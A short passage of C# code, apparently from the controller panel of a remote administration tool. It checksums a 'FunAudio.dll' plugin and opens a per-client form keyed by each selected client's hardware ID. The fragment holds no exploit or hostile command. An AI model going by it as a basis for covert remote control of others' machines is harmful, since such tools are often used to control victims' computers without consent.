		}
		string checksum = Methods.GetChecksum("Plugin\\FunAudio.dll");
		Clients[] array = ClientsSelected();
		foreach (Clients clients in array)
		{
			if ((FormFunAudio)Application.OpenForms["FunAudio:" + clients.Hwid] == null)
			{
